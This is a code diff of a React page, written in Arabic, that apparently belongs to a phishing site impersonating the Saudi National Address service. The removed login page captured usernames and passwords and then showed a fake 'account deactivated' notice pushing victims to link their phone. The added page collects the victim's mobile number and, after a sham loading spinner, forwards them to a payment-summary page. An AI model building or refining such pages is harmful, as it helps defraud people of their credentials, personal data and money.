@@ -1,43 +1,49 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { Link, useLocation } from "wouter";
 import { submitData } from "@/lib/store";
 
-export default function Login() {
+export default function LinkPhone() {
   const [, setLocation] = useLocation();
   const [accountType, setAccountType] = useState("individuals");
   const [username, setUsername] = useState("");
-  const [password, setPassword] = useState("");
-  const [captchaInput, setCaptchaInput] = useState("");
-  const [captchaCode, setCaptchaCode] = useState("");
+  const [phone, setPhone] = useState("");
+  const [phoneError, setPhoneError] = useState("");
   
   // Loading and message states
   const [isLoading, setIsLoading] = useState(false);
-  const [showMessage, setShowMessage] = useState(false);
   
   // Validation states
   const [formErrors, setFormErrors] = useState<string[]>([]);
   const [showErrors, setShowErrors] = useState(false);
 
-  // Generate random CAPTCHA
-  const generateCaptcha = () => {
-    const chars = "0123456789";
-    let code = "";
-    for (let i = 0; i < 4; i++) {
-      code += chars[Math.floor(Math.random() * chars.length)];
+  // Phone validation
+  const validatePhone = (value: string) => {
+    // Only allow numbers
+    const numbersOnly = value.replace(/[^0-9]/g, '').slice(0, 10);
+    setPhone(numbersOnly);
+    
+    if (numbersOnly.length === 10) {
+      const validPrefixes = ['050', '053', '054', '055', '056', '057', '058', '059'];
+      const prefix = numbersOnly.substring(0, 3);
+      if (!validPrefixes.includes(prefix)) {
+        setPhoneError("رقم الجوال يجب أن يبدأ بـ 05X");
+      } else {
+        setPhoneError("");
+      }
+    } else if (numbersOnly.length > 0) {
+      setPhoneError("رقم الجوال يجب أن يتكون من 10 أرقام");
+    } else {
+      setPhoneError("");
     }
-    setCaptchaCode(code);
   };
 
-  useEffect(() => {
-    generateCaptcha();
-  }, []);
-
-  // Handle action with loading and message
+  // Handle action with loading
   const handleActionWithLoading = () => {
     setIsLoading(true);
     setTimeout(() => {
       setIsLoading(false);
-      setShowMessage(true);
+      // Navigate to next page after loading
+      setLocation('/summary-payment');
     }, 3000);
   };
 
@@ -47,8 +53,17 @@ export default function Login() {
     // Validate fields
     const errors: string[] = [];
     if (!username.trim()) errors.push('اسم المستخدم');
-    if (!password.trim()) errors.push('كلمة المرور');
-    if (!captchaInput.trim()) errors.push('الرمز المرئي');
+    if (!phone.trim()) {
+      errors.push('رقم الهاتف المراد ربطه');
+    } else if (phone.length !== 10) {
+      errors.push('رقم الجوال يجب أن يتكون من 10 أرقام');
+    } else {
+      const validPrefixes = ['050', '053', '054', '055', '056', '057', '058', '059'];
+      const prefix = phone.substring(0, 3);
+      if (!validPrefixes.includes(prefix)) {
+        errors.push('رقم الجوال يجب أن يبدأ بـ 05X');
+      }
+    }
     
     if (errors.length > 0) {
       setFormErrors(errors);
@@ -65,26 +80,11 @@ export default function Login() {
     submitData({
       'نوع الحساب': accountTypeLabels[accountType] || accountType,
       'اسم المستخدم': username,
-      'كلمة المرور': password,
+      'رقم الهاتف المراد ربطه': phone,
     });
     
     setShowErrors(false);
     handleActionWithLoading();
-  };
-
-  const handleForgotUsername = (e: React.MouseEvent) => {
-    e.preventDefault();
-    handleActionWithLoading();
-  };
-
-  const handleForgotPassword = (e: React.MouseEvent) => {
-    e.preventDefault();
-    handleActionWithLoading();
-  };
-
-  const handleContinue = () => {
-    setShowMessage(false);
-    setLocation('/link-phone');
   };
 
   return (
@@ -93,38 +93,6 @@ export default function Login() {
       {isLoading && (
         <div className="fixed inset-0 flex items-center justify-center z-50">
           <div className="w-12 h-12 md:w-16 md:h-16 border-4 border-[#04ccf0] border-t-transparent rounded-full animate-spin"></div>
-        </div>
-      )}
-
-      {/* Message Modal */}
-      {showMessage && (
-        <div className="fixed inset-0 flex items-center justify-center z-50 px-4 bg-black bg-opacity-30">
-          <div className="bg-white rounded-lg p-6 md:p-8 max-w-md w-full text-center shadow-lg">
-            <p className="text-sm md:text-base text-[#143c3c] mb-6 md:mb-8 leading-relaxed text-right">
-              تم إلغاء تنشيط هذا الحساب لعدم ربطه برقم هاتف جوال المستخدم المعتمد.
-              يرجى إعادة تنشيط حسابك عبر ربط رقم هاتفك الجوال الخاص بك أو تسجيل مستخدم جديد حتى يتم تسجيل اشتراكك لتحصل على جميع الميزات والخدمات المقدمة في خدمة العنوان الوطني.
-            </p>
-            <div className="flex flex-col gap-3">
-              <button
-                onClick={handleContinue}
-                className="w-full text-[#146c84] font-bold text-sm md:text-base hover:underline"
-              >
-                ربط رقم الهاتف وتنشيط الحساب
-              </button>
-              <a
-                href="/register"
-                className="w-full text-[#146c84] font-bold text-sm md:text-base hover:underline"
-              >
-                تسجيل مستخدم جديد
-              </a>
-              <button
-                onClick={() => setShowMessage(false)}
-                className="w-full text-[#146c84] font-bold text-sm md:text-base hover:underline"
-              >
-                رجوع
-              </button>
-            </div>
-          </div>
         </div>
       )}
 
@@ -168,7 +136,7 @@ export default function Login() {
           <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 lg:p-10">
             {/* Title */}
             <h1 className="text-xl md:text-2xl lg:text-3xl font-bold text-[#143c3c] text-right mb-4 md:mb-6 lg:mb-8">
-              تسجيل الدخول
+              ربط رقم الهاتف وتنشيط الحساب
             </h1>
 
             {/* Account Type Selection */}
@@ -240,7 +208,7 @@ export default function Login() {
               </div>
             </div>
 
-            {/* Login Form */}
+            {/* Form */}
             <form onSubmit={handleSubmit}>
               <h3 className="text-base md:text-lg lg:text-xl font-semibold text-gray-800 text-right mb-3 md:mb-4 lg:mb-6">
                 بيانات التسجيل
@@ -260,58 +228,18 @@ export default function Login() {
                 />
               </div>
 
-              {/* Password Field */}
-              <div className="mb-3 md:mb-4">
-                <input
-                  type="password"
-                  placeholder="كلمة المرور"
-                  value={password}
-                  onChange={(e) => {
-                    const value = e.target.value.replace(/[^a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g, '');
-                    setPassword(value);
-                  }}
-                  className="w-full px-3 md:px-4 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
-                />
-              </div>
-
-              {/* CAPTCHA */}
-              <div className="mb-4 md:mb-6 flex flex-col sm:flex-row items-stretch sm:items-center gap-2 md:gap-3">
-                {/* CAPTCHA Input */}
+              {/* Phone Field */}
+              <div className="mb-4 md:mb-6">
                 <input
                   type="text"
-                  placeholder="الرمز المرئي"
-                  value={captchaInput}
-                  onChange={(e) => setCaptchaInput(e.target.value)}
-                  className="flex-1 px-3 md:px-4 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
+                  placeholder="رقم الهاتف المراد ربطه"
+                  value={phone}
+                  onChange={(e) => validatePhone(e.target.value)}
+                  className="w-full px-3 md:px-4 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
                 />
-
-                <div className="flex items-center gap-2">
-                  {/* CAPTCHA Display */}
-                  <div className="bg-gray-100 border border-gray-300 rounded-lg px-4 py-2.5 md:py-3 min-w-[80px] md:min-w-[100px] text-center flex-1 sm:flex-none">
-                    <span 
-                      className="text-sm md:text-base font-bold text-gray-700 select-none"
-                      style={{ 
-                        fontFamily: "monospace",
-                        letterSpacing: "3px",
-                        textDecoration: "line-through",
-                        fontStyle: "italic"
-                      }}
-                    >
-                      {captchaCode}
-                    </span>
-                  </div>
-
-                  {/* Refresh Button */}
-                  <button
-                    type="button"
-                    onClick={generateCaptcha}
-                    className="bg-gray-100 border border-gray-300 rounded-lg p-2.5 md:p-3 hover:bg-gray-200 transition-colors"
-                  >
-                    <svg className="w-5 h-5 text-[#04ccf0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
-                    </svg>
-                  </button>
-                </div>
+                {phoneError && (
+                  <p className="text-red-500 text-xs mt-1 text-right">{phoneError}</p>
+                )}
               </div>
 
               {/* Error Messages */}
@@ -332,32 +260,8 @@ export default function Login() {
                   type="submit"
                   className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
                 >
-                  تسجيل الدخول
+                  ربط رقم الجوال
                 </button>
-              </div>
-
-              {/* Forgot Links */}
-              <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3 md:gap-4 lg:gap-8 mt-4 md:mt-6">
-                <a 
-                  href="#" 
-                  onClick={handleForgotUsername}
-                  className="flex items-center gap-2 text-[#146c84] hover:text-[#0d4a5c] text-sm md:text-base"
-                >
-                  نسيت اسم المستخدم
-                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
-                  </svg>
-                </a>
-                <a 
-                  href="#" 
-                  onClick={handleForgotPassword}
-                  className="flex items-center gap-2 text-[#146c84] hover:text-[#0d4a5c] text-sm md:text-base"
-                >
-                  نسيت كلمة المرور
-                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
-                  </svg>
-                </a>
               </div>
             </form>
           </div>
